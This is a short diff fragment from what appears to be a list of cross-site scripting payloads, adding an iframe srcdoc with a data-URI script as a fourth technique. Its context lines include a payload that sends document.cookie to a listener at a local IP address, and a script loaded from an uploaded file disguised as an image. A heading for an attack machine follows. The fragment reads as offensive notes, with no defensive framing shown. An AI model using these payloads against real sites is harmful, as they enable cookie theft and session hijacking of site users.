@@ -38,6 +38,8 @@ i.src="http://192.168.0.18:8888/?"+document.cookie;
 # 3.
 <script src="/user_upload/mypic.png.js"></script>
 
+# 4.
+<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
 
 
 # Attack Machine
